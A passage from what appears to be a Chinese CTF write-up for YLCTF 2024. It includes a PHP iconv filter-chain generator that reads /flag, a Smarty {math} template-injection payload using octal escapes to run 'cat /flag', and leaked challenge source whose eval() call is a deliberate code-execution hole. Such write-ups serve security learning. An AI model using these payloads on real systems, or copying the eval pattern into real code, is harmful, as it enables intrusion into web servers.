</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;j&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;k&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;l&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;m&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;n&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;o&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;p&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;q&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;r&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;s&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;t&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;u&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;v&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;w&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;x&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;y&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span>,
</span></span><span style=display:flex><span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$filters <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;convert.base64-encode|&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
</span></span></span><span style=display:flex><span>$filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span> (<span style=color:#a6e22e>str_split</span>(<span style=color:#a6e22e>strrev</span>($base64_payload)) <span style=color:#66d9ef>as</span> $c) {
</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> $conversions[$c] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;|&#34;</span>;
</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-decode|&#34;</span>;
</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-encode|&#34;</span>;
</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-decode&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$final_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;php://filter/</span><span style=color:#e6db74>{</span>$filters<span style=color:#e6db74>}</span><span style=color:#e6db74>/resource=/flag&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $final_payload;
</span></span></code></pre></div><p><img alt=pseudo loading=lazy src=/posts/ctf/ylctf2024/pseudo.png></p><h5 id=round-2-phupe复现>[Round 2] PHUPE(复现)</h5><p>这题写的时候的思路就是尝试文件上传进行smarty的模板注入，但是没有成功。</p><h6 id=0x01>0x01</h6><p>TPL是Smarty模板引擎使用的模板文件格式，它允许将PHP逻辑代码与HTML展示代码分离,使用特殊的标签语法 {标签} 来实现动态内容。</p><p>smarty 可以使用 math + 8进制进行绕过</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>{extends file=&#39;views/layout.tpl&#39;}
</span></span><span style=display:flex><span>{block name=content}
</span></span><span style=display:flex><span>    &lt;h1&gt;CTF File Reader&lt;/h1&gt;
</span></span><span style=display:flex><span>    &lt;form method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
</span></span><span style=display:flex><span>        &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
</span></span><span style=display:flex><span>        &lt;button type=&#34;submit&#34;&gt;Upload&lt;/button&gt;
</span></span><span style=display:flex><span>    &lt;/form&gt;
</span></span><span style=display:flex><span>    &lt;pre&gt;{$file_content}&lt;/pre&gt;
</span></span><span style=display:flex><span>{math equation=&#34;(\&#34;\\163\\171\\163\\164\\145\\155\&#34;)(\&#34;\\143\\141\\164\\40\\57\\146\\154\\141\\147\&#34;)&#34;}
</span></span><span style=display:flex><span>{/block}
</span></span></code></pre></div><p>~~跟着复现没有成功,感觉可能中间跳步骤了。~~时隔一周回来填坑，确实是自己的问题，没有好好研究给的附件，需要在对应的文件上进行文件的覆盖</p><p><img alt=phu loading=lazy src=/posts/ctf/ylctf2024/phu.png></p><p>然后就有flag了</p><h6 id=0x02>0x02</h6><p><a href=https://www.anquanke.com/post/id/103784>从0CTF一道题看move_uploaded_file的一个细节问题</a>,参考链接</p><h5 id=round-2-redfox复现>[Round 2] RedFox(复现)</h5><p>先注册一个账号进行登陆</p><p>有一个上传评论的地方，发现可以有ssrf的漏洞(当时其实想到这层了，没注意回显包)</p><p><img alt=redfox1 loading=lazy src=/posts/ctf/ylctf2024/redfox1.png></p><p><img alt=redfox2 loading=lazy src=/posts/ctf/ylctf2024/redfox2.png></p><p>然后测试一下/flag有无发现没有，</p><p>/uploads/profile_0f1726ba83325848d47e216b29d5ab99.jpg，<del>后面我也没找到本地文件，先到这吧。</del>,继续来填坑。</p><p>不能直接读到flag，尝试读<code>index.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#39;config.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#39;Database.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#39;User.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#39;Post.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#39;Message.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$db <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Database</span>();
</span></span><span style=display:flex><span>$user <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>($db);
</span></span><span style=display:flex><span>$post <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Post</span>($db);
</span></span><span style=display:flex><span>$message <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Message</span>($db);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>$success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;POST&#39;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;action&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>switch</span> ($_POST[<span style=color:#e6db74>&#39;action&#39;</span>]) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;register&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;email&#39;</span>])) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($user<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>register</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>], $_POST[<span style=color:#e6db74>&#39;password&#39;</span>], $_POST[<span style=color:#e6db74>&#39;email&#39;</span>])) {
</span></span><span style=display:flex><span>                        $success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Registration successful. Please log in.&#34;</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        $error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Registration failed. Please try again.&#34;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;login&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($user<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>login</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>], $_POST[<span style=color:#e6db74>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span>                        $success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Login successful.&#34;</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        $error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid username or password.&#34;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;create_post&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;content&#39;</span>])) {
</span></span><span style=display:flex><span>                    $imageUrl <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;image_url&#39;</span>]) <span style=color:#f92672>?</span> $_POST[<span style=color:#e6db74>&#39;image_url&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($post<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>create</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>], $_POST[<span style=color:#e6db74>&#39;content&#39;</span>], $imageUrl)) {
</span></span><span style=display:flex><span>                        $success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Post created successfully.&#34;</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        $error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Failed to create post.&#34;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;send_message&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;to_user_id&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;content&#39;</span>])) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($message<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>send</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>], $_POST[<span style=color:#e6db74>&#39;to_user_id&#39;</span>], $_POST[<span style=color:#e6db74>&#39;content&#39;</span>])) {
</span></span><span style=display:flex><span>                        $success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Message sent successfully.&#34;</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        $error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Failed to send message.&#34;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;download_message&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;data&#39;</span>])) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($user<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>test</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>], $_POST[<span style=color:#e6db74>&#39;data&#39;</span>])) {
</span></span><span style=display:flex><span>                        $success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;successfully.&#34;</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        $error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;fail.&#34;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$feed <span style=color:#f92672>=</span> $post<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getFeed</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>这是<code>Database.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Database</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $conn;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>() {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>conn</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>(<span style=color:#a6e22e>DB_HOST</span>, <span style=color:#a6e22e>DB_USER</span>, <span style=color:#a6e22e>DB_PASS</span>, <span style=color:#a6e22e>DB_NAME</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>conn</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>connect_error</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Connection failed: &#34;</span> <span style=color:#f92672>.</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>conn</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>connect_error</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>query</span>($sql, $params <span style=color:#f92672>=</span> []) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $stmt <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>conn</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>($sql);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($stmt <span style=color:#f92672>===</span> <span style=color:#66d9ef>false</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($params)) {
</span></span><span style=display:flex><span>            $types <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_repeat</span>(<span style=color:#e6db74>&#39;s&#39;</span>, <span style=color:#a6e22e>count</span>($params));
</span></span><span style=display:flex><span>            $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>($types, <span style=color:#f92672>...</span>$params);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>stripos</span>($sql, <span style=color:#e6db74>&#39;select&#39;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>) {
</span></span><span style=display:flex><span>           <span style=color:#66d9ef>return</span> $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_result</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>affected_rows</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>escape</span>($value) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>conn</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>real_escape_string</span>($value);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这是<code>User.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $db;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($db) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> $db;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>register</span>($username, $password, $email) {
</span></span><span style=display:flex><span>        $hashedPassword <span style=color:#f92672>=</span> <span style=color:#a6e22e>password_hash</span>($password, <span style=color:#a6e22e>PASSWORD_DEFAULT</span>);
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO users (username, password, email) VALUES (?, ?, ?)&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$username, $hashedPassword, $email]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>login</span>($username, $password) {
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ?&#34;</span>;
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$username]);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>            $user <span style=color:#f92672>=</span> $result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>password_verify</span>($password, $user[<span style=color:#e6db74>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span>                $_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>] <span style=color:#f92672>=</span> $user[<span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span>                $_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> $user[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>test</span>($id,$data){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>count</span>(<span style=color:#a6e22e>array_unique</span>(<span style=color:#a6e22e>str_split</span>($data))) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[a-z0-9]/i&#39;</span>, $data)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>eval</span>($data);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>post.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Post</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $db;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($db) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> $db;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>create</span>($userId, $content, $imageUrl <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO posts (user_id, content, image_url) VALUES (?, ?, ?)&#34;</span>;
</span></span><span style=display:flex><span>        $image <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>uploadImage</span>($userId,$imageUrl);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$userId, $content, $image]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getFeed</span>($page <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>, $limit <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>) {
</span></span><span style=display:flex><span>        $offset <span style=color:#f92672>=</span> ($page <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> $limit;
